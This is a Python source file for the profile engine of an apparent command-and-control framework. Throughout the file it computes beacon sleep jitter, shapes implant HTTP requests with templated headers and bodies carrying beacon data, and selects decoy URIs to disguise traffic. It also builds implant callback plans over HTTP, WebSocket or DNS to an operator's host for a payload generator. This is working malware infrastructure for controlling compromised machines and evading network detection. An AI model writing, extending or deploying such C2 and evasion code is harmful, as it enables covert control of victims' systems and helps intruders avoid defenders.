"""Profile engine: jitter, request shaping, decoy plan, runtime active profile."""

from __future__ import annotations

import json
import random
import re
import secrets
import uuid
from typing import Any

from squidc5.db.store import Database
from squidc5.profiles.models import DEFAULT_PROFILES, C2Profile

_PLACEHOLDER = re.compile(r"\{(uuid|beacon|rand)\}")


class ProfileEngine:
    def __init__(self, db: Database) -> None:
        self.db = db
        self._cache: dict[str, C2Profile] = {}
        self._active_id: str | None = None

    async def load(self) -> None:
        rows = await self.db.list_profiles()
        if not rows:
            for p in DEFAULT_PROFILES:
                await self.db.upsert_profile(p.id, p.name, p.to_dict(), active=p.active)
            rows = await self.db.list_profiles()
        self._cache.clear()
        self._active_id = None
        for row in rows:
            data = row["config"] if isinstance(row["config"], dict) else json.loads(row["config"])
            data["id"] = row["id"]
            data["name"] = row["name"]
            data["active"] = bool(row.get("active"))
            prof = C2Profile.from_dict(data)
            self._cache[prof.id] = prof
            if prof.active:
                self._active_id = prof.id
        if self._active_id is None and self._cache:
            # ensure one active
            first = next(iter(self._cache.values()))
            await self.set_active(first.id)

    def list_profiles(self) -> list[dict[str, Any]]:
        return [p.to_dict() for p in self._cache.values()]

    def get(self, profile_id: str) -> C2Profile | None:
        return self._cache.get(profile_id)

    def active(self) -> C2Profile | None:
        if self._active_id:
            return self._cache.get(self._active_id)
        return None

    async def set_active(self, profile_id: str) -> C2Profile:
        if profile_id not in self._cache:
            raise KeyError(profile_id)
        await self.db.set_active_profile(profile_id)
        for pid, p in self._cache.items():
            p.active = pid == profile_id
        self._active_id = profile_id
        return self._cache[profile_id]

    async def upsert(self, profile: C2Profile) -> C2Profile:
        await self.db.upsert_profile(
            profile.id, profile.name, profile.to_dict(), active=profile.active
        )
        self._cache[profile.id] = profile
        if profile.active:
            await self.set_active(profile.id)
        return profile

    @staticmethod
    def compute_sleep(base_sec: float, jitter_pct: float, rng: random.Random | None = None) -> float:
        """Sleep with jitter: base ± (jitter_pct% of base)."""
        r = rng or random.Random()
        pct = max(0.0, min(100.0, float(jitter_pct))) / 100.0
        delta = base_sec * pct
        return max(0.1, base_sec + r.uniform(-delta, delta))

    def shape_http_request(
        self,
        profile: C2Profile | None,
        beacon_obj: dict[str, Any],
        *,
        rng: random.Random | None = None,
    ) -> dict[str, Any]:
        """Build outbound implant HTTP request description from profile."""
        p = profile or self.active() or DEFAULT_PROFILES[0]
        http = p.http
        r = rng or random.Random()
        uri = r.choice(http.uris) if http.uris else "/api/v1/implant/beacon"
        beacon_json = json.dumps(beacon_obj, separators=(",", ":"))

        def _sub(m: re.Match[str]) -> str:
            key = m.group(1)
            if key == "uuid":
                return str(uuid.uuid4())
            if key == "beacon":
                return beacon_json
            if key == "rand":
                return secrets.token_hex(8)
            return m.group(0)

        headers = {k: _PLACEHOLDER.sub(_sub, v) for k, v in http.headers.items()}
        body = _PLACEHOLDER.sub(_sub, http.request_body_template)
        if "{beacon}" not in http.request_body_template and body == http.request_body_template:
            # template had no placeholder — if still literal, wrap
            if body == "{beacon}" or not body:
                body = beacon_json
        sleep = self.compute_sleep(http.sleep_sec, http.jitter_pct, r)
        decoys: list[str] = []
        if http.decoy_enabled and http.decoy_paths:
            n = min(2, len(http.decoy_paths))
            decoys = r.sample(http.decoy_paths, k=n)
        return {
            "profile_id": p.id,
            "channel": "http",
            "method": http.method,
            "uri": uri,
            "headers": headers,
            "user_agent": http.user_agent,
            "body": body,
            "sleep_sec": round(sleep, 3),
            "decoy_uris": decoys,
        }

    def implant_snippet(self, profile: C2Profile | None, host: str, port: int) -> dict[str, Any]:
        """Deterministic implant callback plan for payload generator."""
        p = profile or self.active() or DEFAULT_PROFILES[0]
        if p.channel == "dns":
            return {
                "channel": "dns",
                "zone": p.dns.zone,
                "record_type": p.dns.record_type,
                "sleep_sec": p.dns.sleep_sec,
                "jitter_pct": p.dns.jitter_pct,
            }
        if p.channel == "ws":
            return {
                "channel": "ws",
                "url": f"ws://{host}:{port}{p.ws.path}",
                "sleep_sec": p.ws.sleep_sec,
                "jitter_pct": p.ws.jitter_pct,
            }
        shaped = self.shape_http_request(p, {"session_id": None, "hostname": "HOST"})
        return {
            "channel": "http",
            "base": f"http://{host}:{port}",
            "uri": shaped["uri"],
            "method": shaped["method"],
            "headers": shaped["headers"],
            "user_agent": shaped["user_agent"],
            "sleep_sec": p.http.sleep_sec,
            "jitter_pct": p.http.jitter_pct,
            "decoy_enabled": p.http.decoy_enabled,
            "profile_id": p.id,
            "profile_name": p.name,
        }
